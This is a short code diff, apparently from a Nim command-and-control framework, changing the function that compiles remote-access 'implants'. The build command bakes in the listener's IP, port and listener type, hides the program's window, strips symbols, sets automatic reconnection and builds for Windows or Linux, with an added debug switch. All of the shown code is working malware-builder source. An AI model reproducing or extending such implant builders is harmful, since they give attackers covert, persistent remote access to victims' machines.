@@ -28,15 +28,18 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
         infoLog "generating an implant for " & $listener
         ip = listener.ipAddress
         port = $listener.port.uint
+        listenerType = listener.listenerType
 
   let compileCommand = "nim c -d:client " &
     (if showWindow: "" else: "--app=gui " & " ") & # disable window 
     "--passL:-s" & " " &  
     "-d:release" & " " &  
     "-d:ip=" & ip & " " & 
+    "-d:" & listenerType & " " & 
     "-d:port=" & port & " " & 
     "-d:autoConnectTime=" & autoConnectTime & " " & 
-    (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
+    (if platform == "windows": "-d:mingw " else: "--os:linux ") & 
+    (if server.debug: "-d:debug " else: "") & 
     "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
     "./src/client/client.nim"
 
